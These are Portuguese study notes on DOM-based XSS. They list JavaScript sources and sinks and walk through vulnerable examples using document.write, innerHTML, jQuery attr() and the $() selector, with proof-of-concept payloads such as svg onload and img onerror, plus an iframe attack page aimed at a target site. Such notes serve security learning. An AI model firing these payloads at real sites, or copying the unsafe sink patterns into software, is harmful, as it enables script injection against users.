## Sources
É uma propriedade do Javascript que aceita/recebe input de dados. 
```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

## Sink
É uma função do Javascript ou um objeto DOM. A vulnerabilidade DOM ocorre quando um input é enviado do Source para o Sink e é executado de forma insegura. 
```
document.write()
window.location
document.cookie
eval()
document.domain
WebSocket()
element.src
postMessage()
setRequestHeader()
FileReader.readAsText()
ExecuteSql()
sessionStorage.setItem()
document.evaluate()
JSON.parse()
element.setAttribute()
RegExp()
```
## DOM XSS 
###Exemplo
```
+ URL com o parâmetro Search 
https://exemplo.com.br/?search=abcd
```
+ Javascript dentro do HTML
+ O payload é armazenado na função document.write (Sink) e processado pela função window.location.search (Sink)
+ Payload: ```"><svg onload=alert(1)>```
```
<section class=search>
   <form action=/ method=GET>
        <input type=text placeholder='Search the blog' name=search>
             <button type=submit class=button>Search</button>
   </form>
</section>
<script>
   function trackSearch(query) {

//O valor inserido no parâmetro Search é armazenado na função document.wirte
   document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
//O valor de Search é processado pela função window.location.search
   var query = (new URLSearchParams(window.location.search)).get('search');
   if(query) {
      trackSearch(query);
   }
</script>
```
### Exemplo com innerHTML
```
+ URL com o parâmetro Search
https://exemplo.com.br/?search=abcd
```
+ Javascript dentro do HTML
+ O payload é capturado pelo método innerHTML e processado pela função window.location.search
+ Payload: ```<img src=1 onerror=alert(1)>```
```
<script>
   function doSearchQuery(query) {
   document.getElementById('searchMessage').innerHTML = query;
}
   var query = (new URLSearchParams(window.location.search)).get('search');
       if(query) {
               doSearchQuery(query);
}
</script>
```
### Exemplo com botão "Voltar"
```
+ URL com o parâmetro returnPath
https://exemplo.com.br/feedback?returnPath=/
```
+ jQuery usa o parâmetro attr() para processar o valor do parâmetro returnPath
```
<script>
   $(function() {
      $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
 });
 </script>
```
### Exemplo com selector $() do jQuery
+ Payload
```
<html>
   <head>
      <h1>Teste DOM-XSS Selector $() jQuery</h1>
</head>
<body>
   <iframe src="https://site-alvo.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
</body>
</html>
```
